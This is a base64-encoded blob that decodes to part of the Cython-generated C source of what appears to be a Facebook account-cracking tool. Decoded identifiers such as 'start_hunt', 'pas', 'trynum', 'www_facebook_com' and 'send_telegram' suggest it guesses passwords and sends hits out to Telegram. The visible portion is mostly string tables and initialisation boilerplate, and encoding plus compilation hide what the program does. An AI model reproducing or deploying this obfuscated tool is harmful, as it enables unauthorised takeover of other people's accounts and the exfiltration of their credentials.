gCiAge19fcHl4X2tfcGFyc2VfbW9kZSwgc2l6ZW9mKF9fcHl4X2tfcGFyc2VfbW9kZSksIDAsIDEsIDF9LCAKICB7X19weXhfa19wYXMsIHNpemVvZihfX3B5eF9rX3BhcyksIDAsIDEsIDF9LCAKICB7X19weXhfa19wb3AsIHNpemVvZihfX3B5eF9rX3BvcCksIDAsIDEsIDF9LCAKICB7X19weXhfa19wb3N0LCBzaXplb2YoX19weXhfa19wb3N0KSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3ByZWZpbGxfY29udGFjdF9wb2ludCwgc2l6ZW9mKF9fcHl4X2tfcHJlZmlsbF9jb250YWN0X3BvaW50KSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3ByZWZpbGxfc291cmNlLCBzaXplb2YoX19weXhfa19wcmVmaWxsX3NvdXJjZSksIDAsIDEsIDF9LCAKICB7X19weXhfa19wcmVmaWxsX3R5cGUsIHNpemVvZihfX3B5eF9rX3ByZWZpbGxfdHlwZSksIDAsIDEsIDF9LCAKICB7X19weXhfa19wcmludCwgc2l6ZW9mKF9fcHl4X2tfcHJpbnQpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfcHNfbCwgc2l6ZW9mKF9fcHl4X2tfcHNfbCksIDAsIDEsIDF9LCAKICB7X19weXhfa19wc19uLCBzaXplb2YoX19weXhfa19wc19uKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3F1YWxuYW1lLCBzaXplb2YoX19weXhfa19xdWFsbmFtZSksIDAsIDEsIDF9LCAKICB7X19weXhfa19yYW5kaW50LCBzaXplb2YoX19weXhfa19yYW5kaW50KSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3JhbmRvbSwgc2l6ZW9mKF9fcHl4X2tfcmFuZG9tKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9r""X3JhbmdlLCBzaXplb2YoX19weXhfa19yYW5nZSksIDAsIDEsIDF9LCAKICB7X19weXhfa19yZGhkb21haW4sIHNpemVvZihfX3B5eF9rX3JkaGRvbWFpbiksIDAsIDEsIDF9LCAKICB7X19weXhfa19yZWZlcmVyLCBzaXplb2YoX19weXhfa19yZWZlcmVyKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3JlbmRlciwgc2l6ZW9mKF9fcHl4X2tfcmVuZGVyKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3JlcXVlc3RzLCBzaXplb2YoX19weXhfa19yZXF1ZXN0cyksIDAsIDEsIDF9LCAKICB7X19weXhfa19yZXR1cm5fc2Vzc2lvbiwgc2l6ZW9mKF9fcHl4X2tfcmV0dXJuX3Nlc3Npb24pLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfcnIsIHNpemVvZihfX3B5eF9rX3JyKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3NhbWVfb3JpZ2luLCBzaXplb2YoX19weXhfa19zYW1lX29yaWdpbiksIDAsIDEsIDB9LCAKICB7X19weXhfa19zYiwgc2l6ZW9mKF9fcHl4X2tfc2IpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfc2VjX2NoX3ByZWZlcnNfY29sb3Jfc2NoZW1lLCBzaXplb2YoX19weXhfa19zZWNfY2hfcHJlZmVyc19jb2xvcl9zY2hlbWUpLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfc2VjX2NoX3VhLCBzaXplb2YoX19weXhfa19zZWNfY2hfdWEpLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfc2VjX2NoX3VhX2Z1bGxfdmVyc2lvbl9saXN0LCBzaXplb2YoX19weXhfa19zZWNfY2hfdWFfZnVsbF92ZXJzaW9uX2xpc3QpLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfc2VjX2NoX3VhX21vYmlsZSwgc2l6ZW9mKF9fcHl4X2tfc2VjX2NoX3VhX21vYmlsZSksIDAsIDEsIDB9LCAKICB7X19weXhfa19zZWNfY2hfdWFfbW9kZWwsIHNpemVvZihfX3B5eF9rX3NlY19jaF91YV9tb2RlbCksIDAsIDEsIDB9LCAKICB7X19weXhfa19zZWNfY2hfdWFfcGxhdGZvcm0sIHNpemVvZihfX3B5eF9rX3NlY19jaF91YV9wbGF0Zm9ybSksIDAsIDEsIDB9LCAKICB7X19weXhfa19zZWNfY2hfdWFfcGxhdGZvcm1fdmVyc2lvbiwgc2l6ZW9mKF9fcHl4X2tfc2VjX2NoX3VhX3BsYXRmb3JtX3ZlcnNpb24pLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfc2VjX2ZldGNoX2Rlc3QsIHNpemVvZihfX3B5eF9rX3NlY19mZXRjaF9kZXN0KSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rX3NlY19mZXRjaF9tb2RlLCBzaXplb2YoX19weXhfa19zZWNfZmV0Y2hfbW9kZSksIDAsIDEsIDB9LCAKICB7X19weXhfa19zZWNfZmV0Y2hfc2l0ZSwgc2l6ZW9mKF9fcHl4X2tfc2VjX2ZldGNoX3NpdGUpLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfc2VjX2ZldGNoX3VzZXIsIHNpemVvZihfX3B5eF9rX3NlY19mZXRjaF91c2VyKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rX3NlbmQsIHNpemVvZihfX3B5eF9rX3NlbmQpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfc2VuZE1lc3NhZ2UsIHNpemVvZihfX3B5eF9rX3NlbmRNZXNzYWdlKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rX3NlbmRfdGVsZWdyYW0sIHNpemVvZihfX3B5eF9r""X3NlbmRfdGVsZWdyYW0pLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfc2V0X25hbWUsIHNpemVvZihfX3B5eF9rX3NldF9uYW1lKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3NoYVJfcHJlZnNfZGF0YSwgc2l6ZW9mKF9fcHl4X2tfc2hhUl9wcmVmc19kYXRhKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3NpZ25lZF9uZXh0LCBzaXplb2YoX19weXhfa19zaWduZWRfbmV4dCksIDAsIDEsIDF9LCAKICB7X19weXhfa19za2lwX2FwaV9sb2dpbiwgc2l6ZW9mKF9fcHl4X2tfc2tpcF9hcGlfbG9naW4pLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfc2xlZXAsIHNpemVvZihfX3B5eF9rX3NsZWVwKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3NwZWMsIHNpemVvZihfX3B5eF9rX3NwZWMpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfc3MsIHNpemVvZihfX3B5eF9rX3NzKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3N0YXJ0LCBzaXplb2YoX19weXhfa19zdGFydCksIDAsIDEsIDF9LCAKICB7X19weXhfa19zdGFydF9odW50LCBzaXplb2YoX19weXhfa19zdGFydF9odW50KSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3N0cmluZywgc2l6ZW9mKF9fcHl4X2tfc3RyaW5nKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3N0cmlwLCBzaXplb2YoX19weXhfa19zdHJpcCksIDAsIDEsIDF9LCAKICB7X19weXhfa19zeXN0ZW0sIHNpemVvZihfX3B5eF9rX3N5c3RlbSksIDAsIDEsIDF9LCAKICB7X19weXhfa190YXJnZXQsIHNpemVvZihfX3B5eF9rX3RhcmdldCksIDAsIDEsIDF9LCAKICB7X19weXhfa190ZWxlZ21haWxfY29tLCBzaXplb2YoX19weXhfa190ZWxlZ21haWxfY29tKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rX3Rlc3QsIHNpemVvZihfX3B5eF9rX3Rlc3QpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfdGV4dCwgc2l6ZW9mKF9fcHl4X2tfdGV4dCksIDAsIDEsIDF9LCAKICB7X19weXhfa190ZXh0X2h0bWxfYXBwbGljYXRpb25feGh0bWxfeG1sLCBzaXplb2YoX19weXhfa190ZXh0X2h0bWxfYXBwbGljYXRpb25feGh0bWxfeG1sKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rX3RocmVhZF9pZCwgc2l6ZW9mKF9fcHl4X2tfdGhyZWFkX2lkKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3RocmVhZGluZywgc2l6ZW9mKF9fcHl4X2tfdGhyZWFkaW5nKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3Rocm93LCBzaXplb2YoX19weXhfa190aHJvdyksIDAsIDEsIDF9LCAKICB7X19weXhfa190aW1lLCBzaXplb2YoX19weXhfa190aW1lKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3RpbWVvdXQsIHNpemVvZihfX3B5eF9rX3RpbWVvdXQpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfdGltZXpvbmUsIHNpemVvZihfX3B5eF9rX3RpbWV6b25lKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX3RydWUsIHNpemVvZihfX3B5eF9rX3RydWUpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfdHJ5bnVtLCBzaXplb2YoX19weXhfa190cnludW0pLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfdXBncmFkZV9p""bnNlY3VyZV9yZXF1ZXN0cywgc2l6ZW9mKF9fcHl4X2tfdXBncmFkZV9pbnNlY3VyZV9yZXF1ZXN0cyksIDAsIDEsIDB9LCAKICB7X19weXhfa191c2VyX2FnZW50LCBzaXplb2YoX19weXhfa191c2VyX2FnZW50KSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rX3YyXzNCY2xpZW50X3ZlcnNpb25fM0EyOTM1XzNCdGltLCBzaXplb2YoX19weXhfa192Ml8zQmNsaWVudF92ZXJzaW9uXzNBMjkzNV8zQnRpbSksIDAsIDEsIDB9LCAKICB7X19weXhfa192YWx1ZSwgc2l6ZW9mKF9fcHl4X2tfdmFsdWUpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfdmlld3BvcnRfd2lkdGgsIHNpemVvZihfX3B5eF9rX3ZpZXdwb3J0X3dpZHRoKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rX3dkLCBzaXplb2YoX19weXhfa193ZCksIDAsIDEsIDF9LCAKICB7X19weXhfa193aGl0ZSwgc2l6ZW9mKF9fcHl4X2tfd2hpdGUpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfd2xfY2J2LCBzaXplb2YoX19weXhfa193bF9jYnYpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfd3d3X2ZhY2Vib29rX2NvbSwgc2l6ZW9mKF9fcHl4X2tfd3d3X2ZhY2Vib29rX2NvbSksIDAsIDEsIDB9LCAKICB7X19weXhfa194cywgc2l6ZW9mKF9fcHl4X2tfeHMpLCAwLCAxLCAxfSwgCiAgezAsIDAsIDAsIDAsIDB9Cn07CgpzdGF0aWMgaW50IF9fUHl4X0luaXRTdHJpbmdzKF9fUHl4X1N0cmluZ1RhYkVudHJ5IGNvbnN0ICp0LCBQeU9iamVjdCAqKnRhcmdldCwgY29uc3QgY2hhciogY29uc3QqIGVuY29kaW5nX25hbWVzKTsKCgoKc3RhdGljIGludCBfX1B5eF9Jbml0Q2FjaGVkQnVpbHRpbnMoX19weXhfbXN0YXRldHlwZSAqX19weXhfbXN0YXRlKSB7CiAgQ1lUSE9OX1VOVVNFRF9WQVIoX19weXhfbXN0YXRlKTsKICBfX3B5eF9idWlsdGluX3ByaW50ID0gX19QeXhfR2V0QnVpbHRpbk5hbWUoX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfcHJpbnQpOyBpZiAoIV9fcHl4X2J1aWx0aW5fcHJpbnQpIF9fUFlYX0VSUigwLCAxNywgX19weXhfTDFfZXJyb3IpCiAgX19weXhfYnVpbHRpbl9pbnB1dCA9IF9fUHl4X0dldEJ1aWx0aW5OYW1lKF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2lucHV0KTsgaWYgKCFfX3B5eF9idWlsdGluX2lucHV0KSBfX1BZWF9FUlIoMCwgMjcsIF9fcHl4X0wxX2Vycm9yKQogIF9fcHl4X2J1aWx0aW5fcmFuZ2UgPSBfX1B5eF9HZXRCdWlsdGluTmFtZShfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9yYW5nZSk7IGlmICghX19weXhfYnVpbHRpbl9yYW5nZSkgX19QWVhfRVJSKDAsIDY5LCBfX3B5eF9MMV9lcnJvcikKICByZXR1cm4gMDsKICBfX3B5eF9MMV9lcnJvcjo7CiAgcmV0dXJuIC0xOwp9CgoKc3RhdGljIGludCBfX1B5eF9Jbml0Q2FjaGVkQ29uc3RhbnRzKF9fcHl4X21zdGF0ZXR5cGUgKl9fcHl4X21zdGF0ZSkgewogIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zCiAgQ1lUSE9OX1VOVVNFRF9WQVIoX19weXhfbXN0YXRlKTsKICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgi""X19QeXhfSW5pdENhY2hlZENvbnN0YW50cyIsIDApOwoKICAKICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVswXSA9IFB5VHVwbGVfUGFjaygyLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzYpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzBdKSkgX19QWVhfRVJSKDAsIDY5LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMF0pOwogIF9fUHl4X0dJVkVSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMF0pOwoKICAKICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxXSA9IFB5VHVwbGVfUGFjaygzLCBQeV9Ob25lLCBQeV9Ob25lLCBQeV9Ob25lKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxXSkpIF9fUFlYX0VSUigwLCA4MiwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzFdKTsKICBfX1B5eF9HSVZFUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzFdKTsKICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTsKICByZXR1cm4gMDsKICBfX3B5eF9MMV9lcnJvcjo7CiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7CiAgcmV0dXJuIC0xOwp9CgoKc3RhdGljIGludCBfX1B5eF9Jbml0Q29uc3RhbnRzKF9fcHl4X21zdGF0ZXR5cGUgKl9fcHl4X21zdGF0ZSkgewogIENZVEhPTl9VTlVTRURfVkFSKF9fcHl4X21zdGF0ZSk7CiAgX19weXhfbXN0YXRlLT5fX3B5eF91bWV0aG9kX1B5RGljdF9UeXBlX3BvcC50eXBlID0gKFB5T2JqZWN0KikmUHlEaWN0X1R5cGU7CiAgX19weXhfbXN0YXRlLT5fX3B5eF91bWV0aG9kX1B5RGljdF9UeXBlX3BvcC5tZXRob2RfbmFtZSA9ICZfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9wb3A7CiAgaWYgKF9fUHl4X0luaXRTdHJpbmdzKF9fcHl4X3N0cmluZ190YWIsIF9fcHl4X21zdGF0ZS0+X19weXhfc3RyaW5nX3RhYiwgX19weXhfc3RyaW5nX3RhYl9lbmNvZGluZ3MpIDwgMCkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKTsKICBfX3B5eF9tc3RhdGUtPl9fcHl4X2Zsb2F0X18xID0gUHlGbG9hdF9Gcm9tRG91YmxlKC4xKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2Zsb2F0X18xKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogIF9fcHl4X21zdGF0ZS0+X19weXhfZmxvYXRfXzMgPSBQeUZsb2F0X0Zyb21Eb3VibGUoLjMpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfZmxvYXRfXzMpKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMCA9IFB5TG9uZ19Gcm9tTG9uZygwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUt""Pl9fcHl4X2ludF8wKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogIF9fcHl4X21zdGF0ZS0+X19weXhfaW50XzEgPSBQeUxvbmdfRnJvbUxvbmcoMSk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMSkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8zID0gUHlMb25nX0Zyb21Mb25nKDMpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfaW50XzMpKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfNSA9IFB5TG9uZ19Gcm9tTG9uZyg1KTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF81KSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKQogIF9fcHl4X21zdGF0ZS0+X19weXhfaW50XzYgPSBQeUxvbmdfRnJvbUxvbmcoNik7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfNikpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8xMCA9IFB5TG9uZ19Gcm9tTG9uZygxMCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMTApKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCiAgcmV0dXJuIDA7CiAgX19weXhfTDFfZXJyb3I6OwogIHJldHVybiAtMTsKfQoKdHlwZWRlZiBzdHJ1Y3QgewogICAgdW5zaWduZWQgaW50IGFyZ2NvdW50IDogMTsKICAgIHVuc2lnbmVkIGludCBudW1fcG9zb25seV9hcmdzIDogMTsKICAgIHVuc2lnbmVkIGludCBudW1fa3dvbmx5X2FyZ3MgOiAxOwogICAgdW5zaWduZWQgaW50IG5sb2NhbHMgOiA1OwogICAgdW5zaWduZWQgaW50IGZsYWdzIDogMTA7CiAgICB1bnNpZ25lZCBpbnQgZmlyc3RfbGluZSA6IDc7CiAgICB1bnNpZ25lZCBpbnQgbGluZV90YWJsZV9sZW5ndGggOiAxNDsKfSBfX1B5eF9QeUNvZGVfTmV3X2Z1bmN0aW9uX2Rlc2NyaXB0aW9uOwoKc3RhdGljIFB5T2JqZWN0KiBfX1B5eF9QeUNvZGVfTmV3KAogICAgICAgIGNvbnN0IF9fUHl4X1B5Q29kZV9OZXdfZnVuY3Rpb25fZGVzY3JpcHRpb24gZGVzY3IsCiAgICAgICAgUHlPYmplY3QgKiBjb25zdCAqdmFybmFtZXMsCiAgICAgICAgUHlPYmplY3QgKmZpbGVuYW1lLAogICAgICAgIFB5T2JqZWN0ICpmdW5jbmFtZSwKICAgICAgICBjb25zdCBjaGFyICpsaW5lX3RhYmxlLAogICAgICAgIFB5T2JqZWN0ICp0dXBsZV9kZWR1cF9tYXAKKTsKCgpzdGF0aWMgaW50IF9fUHl4X0NyZWF0ZUNvZGVPYmplY3RzKF9fcHl4X21zdGF0ZXR5cGUgKl9fcHl4X21zdGF0ZSkgewogIFB5T2JqZWN0KiB0dXBsZV9kZWR1cF9tYXAgPSBQeURpY3RfTmV3KCk7CiAgaWYgKHVubGlrZWx5KCF0dXBsZV9kZWR1cF9tYXApKSByZXR1cm4gLTE7CiAgewogICAgY29uc3QgX19QeXhfUHlDb2RlX05ld19mdW5jdGlvbl9kZXNjcmlwdGlvbiBkZXNjciA9IHswLCAwLCAw""LCAxLCAodW5zaWduZWQgaW50KShDT19PUFRJTUlaRUR8Q09fTkVXTE9DQUxTfENPX0dFTkVSQVRPUiksIDY5LCAyfTsKICAgIFB5T2JqZWN0KiBjb25zdCB2YXJuYW1lc1tdID0ge19fcHl4X21zdGF0ZS0+X19weXhfbl91X0FfMn07CiAgICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYlswXSA9IF9fUHl4X1B5Q29kZV9OZXcoZGVzY3IsIHZhcm5hbWVzLCBfX3B5eF9tc3RhdGUtPl9fcHl4X2twX3VfbV9nYV9weSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZ2VuZXhwciwgX19weXhfa19RLCB0dXBsZV9kZWR1cF9tYXApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzBdKSkgZ290byBiYWQ7CiAgfQogIHsKICAgIGNvbnN0IF9fUHl4X1B5Q29kZV9OZXdfZnVuY3Rpb25fZGVzY3JpcHRpb24gZGVzY3IgPSB7MSwgMCwgMCwgMywgKHVuc2lnbmVkIGludCkoQ09fT1BUSU1JWkVEfENPX05FV0xPQ0FMUyksIDUzLCA0N307CiAgICBQeU9iamVjdCogY29uc3QgdmFybmFtZXNbXSA9IHtfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9tZXNzYWdlLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9BXzIsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X0JfMn07CiAgICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYlsxXSA9IF9fUHl4X1B5Q29kZV9OZXcoZGVzY3IsIHZhcm5hbWVzLCBfX3B5eF9tc3RhdGUtPl9fcHl4X2twX3VfbV9nYV9weSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3Vfc2VuZF90ZWxlZ3JhbSwgX19weXhfa19CX2FfSElfMV9RY19jLCB0dXBsZV9kZWR1cF9tYXApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzFdKSkgZ290byBiYWQ7CiAgfQogIHsKICAgIGNvbnN0IF9fUHl4X1B5Q29kZV9OZXdfZnVuY3Rpb25fZGVzY3JpcHRpb24gZGVzY3IgPSB7MSwgMCwgMCwgMTcsICh1bnNpZ25lZCBpbnQpKENPX09QVElNSVpFRHxDT19ORVdMT0NBTFMpLCA2MiwgMTAyNX07CiAgICBQeU9iamVjdCogY29uc3QgdmFybmFtZXNbXSA9IHtfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV90aHJlYWRfaWQsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X0UsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X0NfMiwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfQV8yLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9HLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9JLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9CXzIsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X0osIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X0ssIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X0wsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X00sIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X04sIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X08sIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X1AsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X1FfMiwgX19weXhfbXN0YXRlLT5f""X3B5eF9uX3VfZ2VuZXhwciwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZ2VuZXhwcn07CiAgICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYlsyXSA9IF9fUHl4X1B5Q29kZV9OZXcoZGVzY3IsIHZhcm5hbWVzLCBfX3B5eF9tc3RhdGUtPl9fcHl4X2twX3VfbV9nYV9weSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfaGkyX2ZiLCBfX3B5eF9rX0FVX1FfQmRfUnFfV18yMkREdXVfWl9aX01fTV9SX1IsIHR1cGxlX2RlZHVwX21hcCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbMl0pKSBnb3RvIGJhZDsKICB9CiAgewogICAgY29uc3QgX19QeXhfUHlDb2RlX05ld19mdW5jdGlvbl9kZXNjcmlwdGlvbiBkZXNjciA9IHswLCAwLCAwLCAzLCAodW5zaWduZWQgaW50KShDT19PUFRJTUlaRUR8Q09fTkVXTE9DQUxTKSwgOTksIDgxfTsKICAgIFB5T2JqZWN0KiBjb25zdCB2YXJuYW1lc1tdID0ge19fcHl4X21zdGF0ZS0+X19weXhfbl91X0JfMiwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfQ18yLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9BXzJ9OwogICAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbM10gPSBfX1B5eF9QeUNvZGVfTmV3KGRlc2NyLCB2YXJuYW1lcywgX19weXhfbXN0YXRlLT5fX3B5eF9rcF91X21fZ2FfcHksIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X3N0YXJ0X2h1bnQsIF9fcHl4X2tfVV8xX0lXQVdIRl8xX3FfRl8xX1FfYSwgdHVwbGVfZGVkdXBfbWFwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYlszXSkpIGdvdG8gYmFkOwogIH0KICBQeV9ERUNSRUYodHVwbGVfZGVkdXBfbWFwKTsKICByZXR1cm4gMDsKICBiYWQ6CiAgUHlfREVDUkVGKHR1cGxlX2RlZHVwX21hcCk7CiAgcmV0dXJuIC0xOwp9CgoKc3RhdGljIGludCBfX1B5eF9Jbml0R2xvYmFscyh2b2lkKSB7CiAgCiAgaWYgKGxpa2VseShfX1B5eF9pbml0X2NvX3ZhcmlhYmxlcygpID09IDApKTsgZWxzZQoKaWYgKHVubGlrZWx5KFB5RXJyX09jY3VycmVkKCkpKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpCgogIAogICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCnsKICAgIFB5T2JqZWN0ICp0eXBlc01vZHVsZT1OVUxMOwogICAgdHlwZXNNb2R1bGUgPSBQeUltcG9ydF9JbXBvcnRNb2R1bGUoInR5cGVzIik7CiAgICBpZiAodHlwZXNNb2R1bGUpIHsKICAgICAgICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX1B5eF9DYWNoZWRNZXRob2RUeXBlID0gUHlPYmplY3RfR2V0QXR0clN0cmluZyh0eXBlc01vZHVsZSwgIk1ldGhvZFR5cGUiKTsKICAgICAgICBQeV9ERUNSRUYodHlwZXNNb2R1bGUpOwogICAgfQp9IC8vIGVycm9yIGhhbmRsaW5nIGZvbGxvd3MKI2VuZGlmCgppZiAodW5saWtlbHkoUHlFcnJfT2NjdXJyZWQoKSkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKCiAg""cmV0dXJuIDA7CiAgX19weXhfTDFfZXJyb3I6OwogIHJldHVybiAtMTsKfQoKCgoKI2lmZGVmIF9NU0NfVkVSCiNwcmFnbWEgd2FybmluZyggcHVzaCApCgojcHJhZ21hIHdhcm5pbmcoIGRpc2FibGUgOiA0MTI3ICkKI2VuZGlmCgoKCgoKCgojaWYgQ1lUSE9OX1JFRk5BTk5ZCnN0YXRpYyBfX1B5eF9SZWZOYW5ueUFQSVN0cnVjdCAqX19QeXhfUmVmTmFubnlJbXBvcnRBUEkoY29uc3QgY2hhciAqbW9kbmFtZSkgewogICAgUHlPYmplY3QgKm0gPSBOVUxMLCAqcCA9IE5VTEw7CiAgICB2b2lkICpyID0gTlVMTDsKICAgIG0gPSBQeUltcG9ydF9JbXBvcnRNb2R1bGUobW9kbmFtZSk7CiAgICBpZiAoIW0pIGdvdG8gZW5kOwogICAgcCA9IFB5T2JqZWN0X0dldEF0dHJTdHJpbmcobSwgIlJlZk5hbm55QVBJIik7CiAgICBpZiAoIXApIGdvdG8gZW5kOwogICAgciA9IFB5TG9uZ19Bc1ZvaWRQdHIocCk7CmVuZDoKICAgIFB5X1hERUNSRUYocCk7CiAgICBQeV9YREVDUkVGKG0pOwogICAgcmV0dXJuIChfX1B5eF9SZWZOYW5ueUFQSVN0cnVjdCAqKXI7Cn0KI2VuZGlmCgoKI2lmIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURQpzdGF0aWMgaW50IF9fUHl4X1B5RXJyX0V4Y2VwdGlvbk1hdGNoZXNUdXBsZShQeU9iamVjdCAqZXhjX3R5cGUsIFB5T2JqZWN0ICp0dXBsZSkgewogICAgUHlfc3NpemVfdCBpLCBuOwogICAgbiA9IFB5VHVwbG